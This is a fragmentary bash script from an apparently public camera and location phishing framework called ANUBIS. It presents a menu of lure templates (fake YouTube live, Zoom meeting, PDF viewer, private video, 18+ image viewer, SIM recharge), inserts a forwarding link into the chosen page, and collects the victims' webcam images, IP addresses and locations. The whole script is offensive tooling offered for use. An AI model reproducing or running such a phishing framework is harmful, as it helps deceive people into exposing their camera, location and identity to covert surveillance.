...
printf " \e[1;93m ANUBIS Ver 2.1 \e[0m \n"
printf " \e[1;77m Advanced Camera & Location Phishing Framework \e[0m \n"
printf " \e[1;94m https://github.com/lahirusanjika/Anubis-Cam \e[0m \n"
...
catch_location() {
  ...
  if ls location_* 1> /dev/null 2>&1; then
...
# Clean up stale data before monitoring
rm -f ip.txt current_location.txt current_location.bak LocationLog.log Log.log location_*.txt
...
# Check for cam files directly
if ls cam*.png 1> /dev/null 2>&1; then
    # Create images directory if it doesn't exist
    if [[ ! -d "images" ]]; then
        mkdir -p images
    fi
...
sed 's+forwarding_link+'$link'+g' "Zoom Meeting Web.html" > index2.html
elif [[ $option_tem -eq 3 ]]; then
sed 's+forwarding_link+'$link'+g' pdf_viewer.html > index2.html
elif [[ $option_tem -eq 4 ]]; then
sed 's+forwarding_link+'$link'+g' PrivateVideo.html > index2.html
elif [[ $option_tem -eq 5 ]]; then
sed 's+forwarding_link+'$link'+g' ImageViewer.html > index2.html
elif [[ $option_tem -eq 6 ]]; then
sed 's+forwarding_link+'$link'+g' "SIM Recharge.html" > index2.html
fi
rm -rf index3.html
}
...
printf "\n-----Choose a template----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Secure PDF Viewer\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Private Video\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m 18+ Image Viewer\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m SIM Recharge\e[0m\n"
